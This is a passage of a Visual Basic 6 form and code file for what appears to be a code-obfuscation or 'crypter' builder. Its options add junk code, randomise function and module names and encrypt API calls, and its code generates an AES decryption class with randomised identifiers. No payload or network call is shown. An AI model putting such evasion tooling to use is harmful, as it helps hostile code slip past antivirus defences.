      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c49 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   53
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c50 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   52
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c47 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   51
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c42 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   50
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c43 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   49
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c44 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   48
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c45 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   47
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c46 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   46
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c40 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   45
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c41 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   44
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c39 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   43
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c36 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   42
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c37 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   41
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c38 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   40
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c34 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   39
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c35 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   38
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c33 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   37
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c32 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   36
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c31 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   35
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c30 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   34
      Top             =   6240
      Width           =   150
   End
   Begin VB.TextBox c26 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   33
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c27 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   32
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c28 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   31
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c29 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   30
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c18 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   29
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c19 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   28
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c20 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   27
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c21 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   26
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c22 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   25
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c23 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   24
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c24 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   23
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c25 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   22
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c8 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   21
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c9 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   20
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c10 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   19
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c11 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   18
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c12 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   17
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c13 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   16
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c14 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   15
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c15 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   14
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c16 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   13
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c17 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   12
      Top             =   6000
      Width           =   150
   End
   Begin VB.TextBox c2 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   11
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c3 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   10
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c4 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   9
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c5 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   8
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c6 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   7
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c7 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   6
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c1 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   5
      Top             =   5760
      Width           =   150
   End
   Begin VB.TextBox c 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   4
      Top             =   5760
      Width           =   150
   End
   Begin VB.CheckBox Check4 
      Caption         =   "Add junk code"
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   1080
      Width           =   1455
   End
   Begin VB.CheckBox Check3 
      Caption         =   "Generate random (clas)modules name"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   600
      Value           =   2  'Grayed
      Width           =   3015
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Generate random functions name"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   360
      Value           =   2  'Grayed
      Width           =   2655
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Generate random vars\constants name"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   840
      Value           =   2  'Grayed
      Width           =   3135
   End
   Begin VB.Label Label8 
      Caption         =   "?"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2880
      TabIndex        =   248
      ToolTipText     =   "About me"
      Top             =   120
      Width           =   375
   End
   Begin VB.Label Label7 
      Caption         =   "Limiter 2"
      Height          =   255
      Left            =   120
      TabIndex        =   242
      Top             =   1800
      Width           =   735
   End
   Begin VB.Label Label6 
      Caption         =   "Limiter 1"
      Height          =   255
      Left            =   120
      TabIndex        =   241
      Top             =   1440
      Width           =   735
   End
   Begin VB.Label Label5 
      Caption         =   "Randomize level"
      Height          =   255
      Left            =   120
      TabIndex        =   235
      Top             =   3240
      Width           =   1215
   End
   Begin VB.Label Label4 
      Caption         =   "Compile"
      Height          =   255
      Left            =   120
      TabIndex        =   181
      Top             =   3840
      Width           =   615
   End
   Begin VB.Label Label3 
      Caption         =   "Random passwords length"
      Height          =   255
      Left            =   120
      TabIndex        =   177
      Top             =   2400
      Width           =   1935
   End
   Begin VB.Label Label2 
      Caption         =   "APIs encryption"
      Height          =   255
      Left            =   120
      TabIndex        =   176
      Top             =   2160
      Width           =   2535
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim X As String
Dim Buffer() As Byte
Dim blowfish As New cBlowfish
Dim ifile As Integer
Const ltt = "LEBzFKod1DiOUnIwFXBAB9Ly8ROJpS"
Private Function lAES() As String
X = """"
lAES = "VERSION 1.0 CLASS" & vbCrLf & _
"BEGIN" & vbCrLf & _
"  MultiUse = -1" & vbCrLf & _
"  Persistable = 0" & vbCrLf & _
"  DataBindingBehavior = 0" & vbCrLf & _
"  DataSourceBehavior = 0" & vbCrLf & _
"  MTSTransactionMode = 0" & vbCrLf & _
"End" & vbCrLf & _
"Attribute VB_Name = " & X & c.Text & X & vbCrLf & _
"Attribute VB_GlobalNameSpace = False" & vbCrLf & _
"Attribute VB_Creatable = True" & vbCrLf & _
"Attribute VB_PredeclaredId = False" & vbCrLf & _
"Attribute VB_Exposed = False" & vbCrLf & _
"Option Explicit" & vbNewLine & _
"Private byteArray() As Byte" & vbNewLine & _
"Private hiByte As Long" & vbNewLine & _
"Private hiBound As Long" & vbNewLine & _
"Private m_lOnBits(30) As Long" & vbNewLine & _
"Private m_l2Power(30) As Long" & vbNewLine & _
"Private m_bytOnBits(7) As Byte" & vbNewLine & _
"Private m_byt2Power(7) As Byte" & vbNewLine & _
"Private m_InCo(3) As Byte" & vbNewLine & _
"Private m_fbsub(255) As Byte" & vbNewLine & _
"Private m_rbsub(255) As Byte" & vbNewLine & _
"Private m_ptab(255)  As Byte" & vbNewLine

lAES = lAES & "Private m_ltab(255)  As Byte" & vbNewLine & _
"Private m_ftable(255) As Long" & vbNewLine & _
"Private m_rtable(255) As Long" & vbNewLine & _
"Private m_rco(29) As Long" & vbNewLine & _
"Private m_Nk As Long" & vbNewLine & _
"Private m_Nb As Long" & vbNewLine & _
"Private m_Nr As Long" & vbNewLine & _
"Private m_fi(23) As Byte" & vbNewLine & _
"Private m_ri(23) As Byte" & vbNewLine & _
"Private m_fkey(119) As Long" & vbNewLine & _
"Private m_rkey(119) As Long" & vbNewLine & _
"Private Declare Sub " & f.aes.Text & " Lib " & X & "kernel32" & X & " Alias " & X & "RtlMoveMemory" & X & " (ByVal " & f.aes1.Text & " As Any, ByVal " & f.aes2.Text & " As Any, ByVal " & f.aes3.Text & " As Long)" & vbNewLine

lAES = lAES & "Private Sub Append(ByRef StringData As String, Optional Length As Long)" & vbNewLine & _
"  Dim DataLength As Long" & vbNewLine & _
"  If Length > 0 Then DataLength = Length Else DataLength = Len(StringData)" & vbNewLine & _
"  If DataLength + hiByte > hiBound Then" & vbNewLine & _
"  hiBound = hiBound + 1024" & vbNewLine & _
"  ReDim Preserve ByteArray(hiBound)" & vbNewLine & _
"  End If" & vbNewLine & _
"  " & f.aes.Text & " ByVal VarPtr(ByteArray(hiByte)), ByVal StringData, DataLength" & vbNewLine & _
"  hiByte = hiByte + DataLength" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Property Get GData() As String" & vbNewLine & _
"  Dim StringData As String" & vbNewLine & _
"  StringData = Space(hiByte)" & vbNewLine & _
"  " & f.aes.Text & " ByVal StringData, ByVal VarPtr(byteArray(0)), hiByte" & vbNewLine & _
"  GData = StringData" & vbNewLine & _
"End Property" & vbNewLine

lAES = lAES & "Private Function EnHex(Data As String) As String" & vbNewLine & _
"  Dim iCount As Double, sTemp As String" & vbNewLine & _
"  Reset" & vbNewLine & _
"  For iCount = 1 To Len(Data)" & vbNewLine & _
"  sTemp = Hex$(Asc(Mid$(Data, iCount, 1)))" & vbNewLine & _
"  If Len(sTemp) < 2 Then sTemp = 0 & sTemp" & vbNewLine & _
"  Append sTemp" & vbNewLine & _
"  Next" & vbNewLine & _
"  EnHex = GData" & vbNewLine & _
"  Reset" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Sub Reset()" & vbNewLine & _
"  hiByte = 0" & vbNewLine & _
"  hiBound = 1024" & vbNewLine & _
"  ReDim byteArray(hiBound)" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Public Function " & c1.Text & "(Text As String, Optional Key As String, Optional IsTextInHex As Boolean) As String" & vbNewLine & _
"  Dim bytOut() As Byte, bytKey() As Byte, lCount As Long, lLength As Long" & vbNewLine & _
"  bytKey = Key" & vbNewLine & _
"  If IsTextInHex = False Then Text = EnHex(Text)" & vbNewLine & _
"  lLength = Len(Text)" & vbNewLine & _
"  ReDim bytOut((lLength \ 2) - 1)" & vbNewLine & _
"  For lCount = 1 To lLength Step 2" & vbNewLine & _
"  bytOut(lCount \ 2) = CByte(" & X & "&H" & X & " & Mid$(Text, lCount, 2))" & vbNewLine & _
"  Next" & vbNewLine & _
"  " & c1.Text & " = DecryptData(bytOut, bytKey)" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Sub Class_Initialize()" & vbNewLine & _
"  m_InCo(0) = &HB" & vbNewLine & _
"  m_InCo(1) = &HD" & vbNewLine & _
"  m_InCo(2) = &H9" & vbNewLine & _
"  m_InCo(3) = &HE" & vbNewLine & _
"  m_bytOnBits(0) = 1" & vbNewLine & _
"  m_bytOnBits(1) = 3" & vbNewLine & _
"  m_bytOnBits(2) = 7" & vbNewLine & _
"  m_bytOnBits(3) = 15" & vbNewLine & _
"  m_bytOnBits(4) = 31" & vbNewLine & _
"  m_bytOnBits(5) = 63" & vbNewLine & _
"  m_bytOnBits(6) = 127" & vbNewLine & _
"  m_bytOnBits(7) = 255" & vbNewLine & _
"  m_byt2Power(0) = 1" & vbNewLine & _
"  m_byt2Power(1) = 2" & vbNewLine & _
"  m_byt2Power(2) = 4" & vbNewLine & _
"  m_byt2Power(3) = 8" & vbNewLine & _
"  m_byt2Power(4) = 16" & vbNewLine & _
"  m_byt2Power(5) = 32" & vbNewLine & _
"  m_byt2Power(6) = 64" & vbNewLine & _
"  m_byt2Power(7) = 128" & vbNewLine & _
"  m_lOnBits(0) = 1" & vbNewLine & _
"  m_lOnBits(1) = 3" & vbNewLine & _
"  m_lOnBits(2) = 7" & vbNewLine & "  m_lOnBits(3) = 15" & vbNewLine
  
lAES = lAES & "  m_lOnBits(4) = 31" & vbNewLine & _
"  m_lOnBits(5) = 63" & vbNewLine & _
"  m_lOnBits(6) = 127" & vbNewLine & _
"  m_lOnBits(7) = 255" & vbNewLine & _
"  m_lOnBits(8) = 511" & vbNewLine & _
"  m_lOnBits(9) = 1023" & vbNewLine & _
"  m_lOnBits(10) = 2047" & vbNewLine & _
"  m_lOnBits(11) = 4095" & vbNewLine & _
"  m_lOnBits(12) = 8191" & vbNewLine & _
"  m_lOnBits(13) = 16383" & vbNewLine & _
"  m_lOnBits(14) = 32767" & vbNewLine & _
"  m_lOnBits(15) = 65535" & vbNewLine & _
"  m_lOnBits(16) = 131071" & vbNewLine & _
"  m_lOnBits(17) = 262143" & vbNewLine & _
"  m_lOnBits(18) = 524287" & vbNewLine & _
"  m_lOnBits(19) = 1048575" & vbNewLine & _
"  m_lOnBits(20) = 2097151" & vbNewLine & _
"  m_lOnBits(21) = 4194303" & vbNewLine & _
"  m_lOnBits(22) = 8388607" & vbNewLine & _
"  m_lOnBits(23) = 16777215" & vbNewLine & _
"  m_lOnBits(24) = 33554431" & vbNewLine & _
"  m_lOnBits(25) = 67108863" & vbNewLine & _
"  m_lOnBits(26) = 134217727" & vbNewLine & _
"  m_lOnBits(27) = 268435455" & vbNewLine & _
"  m_lOnBits(28) = 536870911" & vbNewLine & "  m_lOnBits(29) = 1073741823" & vbNewLine
  
lAES = lAES & "  m_lOnBits(30) = 2147483647" & vbNewLine & _
"  m_l2Power(0) = 1" & vbNewLine & _
"  m_l2Power(1) = 2" & vbNewLine & _
"  m_l2Power(2) = 4" & vbNewLine & _
"  m_l2Power(3) = 8" & vbNewLine & _
"  m_l2Power(4) = 16" & vbNewLine & _
"  m_l2Power(5) = 32" & vbNewLine & _
"  m_l2Power(6) = 64" & vbNewLine & _
"  m_l2Power(7) = 128" & vbNewLine & _
"  m_l2Power(8) = 256" & vbNewLine & _
"  m_l2Power(9) = 512" & vbNewLine & _
"  m_l2Power(10) = 1024" & vbNewLine & _
"  m_l2Power(11) = 2048" & vbNewLine & _
"  m_l2Power(12) = 4096" & vbNewLine & _
"  m_l2Power(13) = 8192" & vbNewLine & _
"  m_l2Power(14) = 16384" & vbNewLine & _
"  m_l2Power(15) = 32768" & vbNewLine & _
"  m_l2Power(16) = 65536" & vbNewLine & _
"  m_l2Power(17) = 131072" & vbNewLine & _
"  m_l2Power(18) = 262144" & vbNewLine & _
"  m_l2Power(19) = 524288" & vbNewLine & _
"  m_l2Power(20) = 1048576" & vbNewLine & _
"  m_l2Power(21) = 2097152" & vbNewLine & _
"  m_l2Power(22) = 4194304" & vbNewLine & "  m_l2Power(23) = 8388608" & vbNewLine
  
lAES = lAES & "  m_l2Power(24) = 16777216" & vbNewLine & _
"  m_l2Power(25) = 33554432" & vbNewLine & _
"  m_l2Power(26) = 67108864" & vbNewLine & _
"  m_l2Power(27) = 134217728" & vbNewLine & _
"  m_l2Power(28) = 268435456" & vbNewLine & _
"  m_l2Power(29) = 536870912" & vbNewLine & _
"  m_l2Power(30) = 1073741824" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Function Lshift(ByVal lValue As Long, ByVal iShiftBits As Integer) As Long" & vbNewLine & _
"  If iShiftBits = 0 Then" & vbNewLine & _
"  Lshift = lValue" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf iShiftBits = 31 Then" & vbNewLine & _
"  If lValue And 1 Then Lshift = &H80000000 Else Lshift = 0" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf iShiftBits < 0 Or iShiftBits > 31 Then" & vbNewLine & _
"  Err.Raise 6" & vbNewLine & _
"  End If" & vbNewLine & _
"  If (lValue And m_l2Power(31 - iShiftBits)) Then Lshift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000 Else Lshift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function Rshift(ByVal lValue As Long, ByVal iShiftBits As Integer) As Long" & vbNewLine & _
"  If iShiftBits = 0 Then" & vbNewLine & _
"  Rshift = lValue" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf iShiftBits = 31 Then" & vbNewLine & _
"  If lValue And &H80000000 Then Rshift = 1 Else Rshift = 0" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf iShiftBits < 0 Or iShiftBits > 31 Then" & vbNewLine & _
"  Err.Raise 6" & vbNewLine & _
"  End If" & vbNewLine & _
"  Rshift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)" & vbNewLine & _
"  If (lValue And &H80000000) Then Rshift = (Rshift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function LShiftByte(ByVal bytValue As Byte, ByVal bytShiftBits As Byte) As Byte" & vbNewLine & _
"  If bytShiftBits = 0 Then" & vbNewLine & _
"  LShiftByte = bytValue" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf bytShiftBits = 7 Then" & vbNewLine & _
"  If bytValue And 1 Then LShiftByte = &H80 Else LShiftByte = 0" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf bytShiftBits < 0 Or bytShiftBits > 7 Then" & vbNewLine & _
"  Err.Raise 6" & vbNewLine & _
"  End If" & vbNewLine & _
"  LShiftByte = ((bytValue And m_bytOnBits(7 - bytShiftBits)) * m_byt2Power(bytShiftBits))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function RShiftByte(ByVal bytValue As Byte, ByVal bytShiftBits As Byte) As Byte" & vbNewLine & _
"  If bytShiftBits = 0 Then" & vbNewLine & _
"  RShiftByte = bytValue" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf bytShiftBits = 7 Then" & vbNewLine & _
"  If bytValue And &H80 Then RShiftByte = 1 Else RShiftByte = 0" & vbNewLine & _
"  Exit Function" & vbNewLine & _
"  ElseIf bytShiftBits < 0 Or bytShiftBits > 7 Then" & vbNewLine & _
"  Err.Raise 6" & vbNewLine & _
"  End If" & vbNewLine & _
"  RShiftByte = bytValue \ m_byt2Power(bytShiftBits)" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function RotateLeft(ByVal lValue As Long, ByVal iShiftBits As Integer) As Long" & vbNewLine & _
"  RotateLeft = Lshift(lValue, iShiftBits) Or Rshift(lValue, (32 - iShiftBits))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function RotateLeftByte(ByVal bytValue As Byte, ByVal bytShiftBits As Byte) As Byte" & vbNewLine & _
"  RotateLeftByte = LShiftByte(bytValue, bytShiftBits) Or RShiftByte(bytValue, (8 - bytShiftBits))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function Pack(b() As Byte) As Long" & vbNewLine & _
"  Dim lCount As Long" & vbNewLine & _
"  Dim lTemp  As Long" & vbNewLine & _
"  For lCount = 0 To 3" & vbNewLine & _
"  lTemp = b(lCount)" & vbNewLine & _
"  Pack = Pack Or Lshift(lTemp, (lCount * 8))" & vbNewLine & _
"  Next" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function PackFrom(b() As Byte, ByVal k As Long) As Long" & vbNewLine & _
"  Dim lCount As Long, lTemp  As Long" & vbNewLine & _
"  For lCount = 0 To 3" & vbNewLine & _
"  lTemp = b(lCount + k)" & vbNewLine & _
"  PackFrom = PackFrom Or Lshift(lTemp, (lCount * 8))" & vbNewLine & _
"  Next" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Sub Unpack(ByVal a As Long, b() As Byte)" & vbNewLine & _
"  b(0) = a And m_lOnBits(7)" & vbNewLine & _
"  b(1) = Rshift(a, 8) And m_lOnBits(7)" & vbNewLine & _
"  b(2) = Rshift(a, 16) And m_lOnBits(7)" & vbNewLine & _
"  b(3) = Rshift(a, 24) And m_lOnBits(7)" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Sub UnpackFrom(ByVal a As Long, b() As Byte, ByVal k As Long)" & vbNewLine & _
"  b(0 + k) = a And m_lOnBits(7)" & vbNewLine & _
"  b(1 + k) = Rshift(a, 8) And m_lOnBits(7)" & vbNewLine & _
"  b(2 + k) = Rshift(a, 16) And m_lOnBits(7)" & vbNewLine & _
"  b(3 + k) = Rshift(a, 24) And m_lOnBits(7)" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Function xtime(ByVal a As Byte) As Byte" & vbNewLine & _
"  Dim b As Byte" & vbNewLine & _
"  If (a And &H80) Then b = &H1B Else b = 0" & vbNewLine & _
"  a = LShiftByte(a, 1)" & vbNewLine & _
"  a = a Xor b" & vbNewLine & _
"  xtime = a" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function bmul(ByVal x As Byte, y As Byte) As Byte" & vbNewLine & _
"  If x <> 0 And y <> 0 Then bmul = m_ptab((CLng(m_ltab(x)) + CLng(m_ltab(y))) Mod 255) Else bmul = 0" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function SubByte(ByVal a As Long) As Long" & vbNewLine & _
"  Dim b(3) As Byte" & vbNewLine & _
"  Unpack a, b" & vbNewLine & _
"  b(0) = m_fbsub(b(0)): b(1) = m_fbsub(b(1))" & vbNewLine & _
"  b(2) = m_fbsub(b(2)): b(3) = m_fbsub(b(3))" & vbNewLine & _
"  SubByte = Pack(b)" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function product(ByVal x As Long, ByVal y As Long) As Long" & vbNewLine & _
"  Dim xb(3) As Byte, yb(3) As Byte" & vbNewLine & _
"  Unpack x, xb" & vbNewLine & _
"  Unpack y, yb" & vbNewLine & _
"  product = bmul(xb(0), yb(0)) Xor bmul(xb(1), yb(1)) Xor bmul(xb(2), yb(2)) Xor bmul(xb(3), yb(3))" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function InvMixCol(ByVal x As Long) As Long" & vbNewLine & _
"  Dim y As Long, m As Long, b(3) As Byte" & vbNewLine & _
"  m = Pack(m_InCo): b(3) = product(m, x)" & vbNewLine & _
"  m = RotateLeft(m, 24): b(2) = product(m, x)" & vbNewLine & _
"  m = RotateLeft(m, 24): b(1) = product(m, x)" & vbNewLine & _
"  m = RotateLeft(m, 24): b(0) = product(m, x)" & vbNewLine & _
"  y = Pack(b): InvMixCol = y" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Function ByteSub(ByVal x As Byte) As Byte" & vbNewLine & _
"  Dim y As Byte" & vbNewLine & _
"  y = m_ptab(255 - m_ltab(x)): x = y" & vbNewLine & _
"  x = RotateLeftByte(x, 1): y = y Xor x" & vbNewLine & _
"  x = RotateLeftByte(x, 1): y = y Xor x" & vbNewLine & _
"  x = RotateLeftByte(x, 1): y = y Xor x" & vbNewLine & _
"  x = RotateLeftByte(x, 1): y = y Xor x" & vbNewLine & _
"  y = y Xor &H63: ByteSub = y" & vbNewLine & _
"End Function" & vbNewLine

lAES = lAES & "Private Sub gentables()" & vbNewLine & _
"  Dim i As Long, y As Byte, b(3) As Byte, ib As Byte" & vbNewLine & _
"  m_ltab(0) = 0: m_ptab(0) = 1: m_ltab(1) = 0: m_ptab(1) = 3: m_ltab(3) = 1" & vbNewLine & _
"  For i = 2 To 255" & vbNewLine & _
"  m_ptab(i) = m_ptab(i - 1) Xor xtime(m_ptab(i - 1)): m_ltab(m_ptab(i)) = i" & vbNewLine & _
"  Next" & vbNewLine & _
"  m_fbsub(0) = &H63: m_rbsub(&H63) = 0" & vbNewLine & _
"  For i = 1 To 255" & vbNewLine & _
"  ib = i: y = ByteSub(ib): m_fbsub(i) = y: m_rbsub(y) = i" & vbNewLine & _
"  Next" & vbNewLine & _
"  y = 1" & vbNewLine & _
"  For i = 0 To 29" & vbNewLine & _
"  m_rco(i) = y: y = xtime(y)" & vbNewLine & _
"  Next" & vbNewLine & _
"  For i = 0 To 255" & vbNewLine & _
"  y = m_fbsub(i): b(3) = y Xor xtime(y)" & vbNewLine & _
"  b(2) = y: b(1) = y: b(0) = xtime(y)" & vbNewLine & _
"  m_ftable(i) = Pack(b): y = m_rbsub(i)" & vbNewLine & _
"  b(3) = bmul(m_InCo(0), y): b(2) = bmul(m_InCo(1), y)" & vbNewLine & _
"  b(1) = bmul(m_InCo(2), y): b(0) = bmul(m_InCo(3), y)" & vbNewLine & _
"  m_rtable(i) = Pack(b)" & vbNewLine & _
"  Next" & vbNewLine & _
"End Sub" & vbNewLine

lAES = lAES & "Private Sub gkey(ByVal nb As Long, ByVal nk As Long, Key() As Byte)" & vbNewLine & _
"  Dim i As Long, j As Long, k As Long, m As Long, N As Long, c1 As Long, c2 As Long, c3 As Long, CipherKey(7) As Long" & vbNewLine & _
"  m_Nb = nb: m_Nk = nk" & vbNewLine & _
"  If m_Nb >= m_Nk Then m_Nr = 6 + m_Nb Else m_Nr = 6 + m_Nk" & vbNewLine & _
"  c1 = 1" & vbNewLine & _
"  If m_Nb < 8 Then" & vbNewLine & _
"  c2 = 2: c3 = 3" & vbNewLine & _
"  Else" & vbNewLine & _
"  c2 = 3: c3 = 4" & vbNewLine & _
"  End If" & vbNewLine & _
"  For j = 0 To nb - 1" & vbNewLine & _
"  m = j * 3" & vbNewLine & _
"  m_fi(m) = (j + c1) Mod nb: m_fi(m + 1) = (j + c2) Mod nb" & vbNewLine & _
"  m_fi(m + 2) = (j + c3) Mod nb: m_ri(m) = (nb + j - c1) Mod nb" & vbNewLine & _
